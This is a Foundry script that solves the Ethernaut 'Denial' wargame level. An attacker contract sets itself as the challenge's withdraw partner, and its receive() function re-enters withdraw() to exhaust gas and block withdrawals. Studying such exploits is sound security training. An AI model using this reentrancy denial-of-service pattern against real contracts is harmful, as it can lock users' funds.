// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Denial} from "../../src/Ethernaut/Denial.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        DenialAttacker attack = new DenialAttacker();
        attack.attack();
        vm.stopBroadcast();
    }
}

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
    function contractBalance() external view returns (uint);
}

contract DenialAttacker {
    address public challengeInstance = 0xe746D2A1B372F178438A5641Fc44e1C5D7dFF9AC;

    function attack() external {
        IDenial(challengeInstance).setWithdrawPartner(address(this));
    }

    receive() external payable {
        IDenial(msg.sender).withdraw();
    }
}
